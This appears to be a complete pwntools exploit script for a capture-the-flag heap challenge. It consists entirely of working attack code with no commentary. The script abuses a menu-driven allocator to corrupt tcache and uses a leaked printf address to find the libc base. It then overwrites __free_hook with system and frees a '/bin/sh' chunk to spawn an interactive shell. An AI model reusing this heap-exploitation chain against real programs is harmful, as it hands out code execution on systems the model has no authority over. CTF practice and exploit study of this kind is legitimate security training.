from pwn import*
context.log_level = 'DEBUG'
context.terminal = ['gnome-terminal','-x','sh','-c']
def menu(ch):
	p.sendlineafter('choice:',str(ch))
def new(index,size,content):
	menu(1)
	p.sendlineafter('index:',str(index))
	p.sendlineafter('size:',str(size))
	p.sendafter('content:',content)
def free(index):
	menu(3)
	p.sendlineafter('index:',str(index))
def edit(index,size,content):
	menu(2)
	p.sendlineafter('index:',str(index))
	p.sendlineafter('size:',str(size))
	p.sendafter('content:',content)
def show(index):
	menu(4)
	p.sendlineafter('index',str(index))
def F(index):
	menu(2)
	p.sendlineafter('index:',str(index))
	p.sendlineafter('size:',str(0))
p = process('./pwn')
libc =ELF('./libc.so.6')
for i in range(9):
	new(i,0x10,'FMYY')
for i in range(7):
	free(8 - i)
F(0)
F(1)
edit(1,0x10,'\x50')
gdb.attach(p)
pause()
new(2,0x10,'FMYY')
new(3,0x10,'/bin/sh\x00')
menu(666)
p.recvuntil('there is a gift: ')
libc_base = int(p.recv(14),16)  - libc.sym['printf'] - 0x201910
log.info('LIBC:\t' + hex(libc_base))
p.sendline('FMYY')
new(4,0x50,'FMYY')
F(4)
edit(4,0x50,'\x00'*0x10)
F(4)
menu(666)
p.sendline(p64(libc_base + libc.sym['__free_hook']))
menu(666)
p.sendline('FMYY')
menu(666)
p.sendline(p64(libc_base + libc.sym['system']))
free(3)
p.interactive()